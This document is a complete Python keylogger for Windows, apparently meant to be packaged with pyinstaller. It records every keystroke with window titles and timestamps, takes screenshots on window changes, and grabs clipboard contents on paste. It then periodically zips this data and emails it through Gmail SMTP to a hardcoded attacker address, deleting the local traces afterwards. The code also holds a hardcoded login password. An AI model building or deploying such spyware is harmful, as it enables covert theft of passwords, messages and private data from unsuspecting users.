# set PYTHONIOENCODING=UTF-8
# pyinstaller -F key.py

import pyHook, pythoncom, sys, win32api, os, time
import win32clipboard, zipfile
from PIL import ImageGrab
import shutil, getpass
import mimetypes, smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

addr = sys.path[0] + '\\log.txt'
pic_path = sys.path[0] + '\\pic'
curr_window = ''
counter = 0
zip_path = sys.path[0] + '\\secret.zip'
log = open(addr, 'a+')
print(addr)

def before_send_after():
    # Before
    zip = zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED)
    for dirpath, dirnames, filenames in os.walk(pic_path):
        for filename in filenames:
            zip.write(os.path.join(dirpath, filename), 'pic\\' + filename)
    log.flush()
    zip.write(addr, 'log.txt')
    zip.close()
    shutil.rmtree(pic_path)
    log.truncate(0)

    send_email()

    # After
    os.remove(zip_path)

def send_email():
    #send ZIP to email
    sender = 'a.very.casual.email@gmail.com'
    receivers = 'a.very.casual.email@gmail.com'
    
    msg = MIMEMultipart()
    msg.attach(MIMEText("Got new classified information!", 'html'))
    msg['Subject'] = 'New Screat From %s' % getpass.getuser()
    msg['From'] = sender
    msg['To'] = receivers

    data = open(zip_path, 'rb')
    ctype, encoding = mimetypes.guess_type(zip_path)
    if ctype is None or encoding is not None:
        ctype = 'application/octet-stream'
    maintype, subtype = ctype.split('/', 1)
    file_msg = MIMEBase(maintype, subtype)
    file_msg.set_payload(data.read())
    data.close()
    encoders.encode_base64(file_msg) 
    file_msg.add_header('Content-Disposition', 'attachment', filename="secret.zip")
    msg.attach(file_msg)

    s = smtplib.SMTP_SSL(host = 'smtp.gmail.com', port = 465)
    s.login(user = 'a.very.casual.email@gmail.com', password = 'HACKERNB123')
    s.sendmail(sender, receivers, msg.as_string())
    s.quit()
    
def KBevent(event):
    global curr_window, counter
    if curr_window != event.WindowName:
        # zip all info and send to the hacker
        if counter > 5:
            counter = 0
            before_send_after()

        # Keyboard record part
        curr_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
        log.write("\n\n")
        curr_window = event.WindowName
        log.write("Time: %s\n" % curr_time)
        log.write("Window: %s\n" % curr_window)
        log.write("Pic ID: %s\n" % counter)
        log.write("Key: ")
        # Screen shot part
        if not os.path.exists(pic_path):
            os.makedirs(pic_path)
        pic = ImageGrab.grab()
        pic.save(os.path.join(pic_path, str(counter) + ".jpg"))
        counter += 1
    # Special handling of non-letters
    if len(event.Key) > 1:
        temp = '[' + event.Key + ']'
        log.write(temp)
    else:
        log.write(event.Key)
    if event.Key == 'V':
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            log.write("\nPASTE: %s\nKey: " % pasted_value)
    # Press the F12 key to exit the program
    if str(event.Key) == 'F12': 
        log.close()
        os.remove(addr)
        shutil.rmtree(pic_path)
        win32api.PostQuitMessage()
    return True
    
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = KBevent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()

